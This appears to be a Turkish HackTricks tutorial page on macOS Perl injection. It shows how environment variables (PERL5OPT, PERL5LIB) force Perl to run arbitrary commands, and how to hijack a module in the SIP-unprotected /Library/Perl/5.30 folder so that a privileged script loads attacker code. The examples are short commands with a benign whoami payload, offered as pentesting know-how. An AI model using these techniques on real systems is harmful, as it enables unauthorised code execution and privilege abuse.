# macOS Perl Uygulamaları Enjeksiyonu

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) içeren koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## `PERL5OPT` ve `PERL5LIB` çevresel değişkeni Aracılığıyla

PERL5OPT çevresel değişkenini kullanarak, perl'in keyfi komutları çalıştırmasını sağlamak mümkündür.\
Örneğin, bu betiği oluşturun:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Şimdi **çevre değişkenini ihraç et** ve **perl** betiğini çalıştır:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Başka bir seçenek, bir Perl modülü oluşturmaktır (ör. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Ve ardından çevresel değişkenleri kullanın:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Bağımlılıklar aracılığıyla

Perl'in çalıştırıldığı bağımlılıkların klasör sırasını listelemek mümkündür:
```bash
perl -e 'print join("\n", @INC)'
```
Hangi şu şekilde bir şey döndürecektir:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Bazı dönen klasörler bile mevcut değil, ancak **`/Library/Perl/5.30`** **mevcut**, **SIP** tarafından **korunmuyor** ve **SIP** tarafından **korunan klasörlerden önce** bulunuyor. Bu nedenle, birisi o klasörü kötüye kullanarak betik bağımlılıklarını ekleyebilir, böylece yüksek ayrıcalıklı bir Perl betiği onu yükler.

{% hint style="warning" %}
Ancak, o klasöre yazmak için **kök kullanıcı olmanız gerektiğini** ve günümüzde bu **TCC uyarısı** alacağınızı unutmayın:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

Örneğin, bir betik **`use File::Basename;`** içe aktarıyorsa, `/Library/Perl/5.30/File/Basename.pm` oluşturularak keyfi kod yürütülmesi mümkün olacaktır.

## Referanslar

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
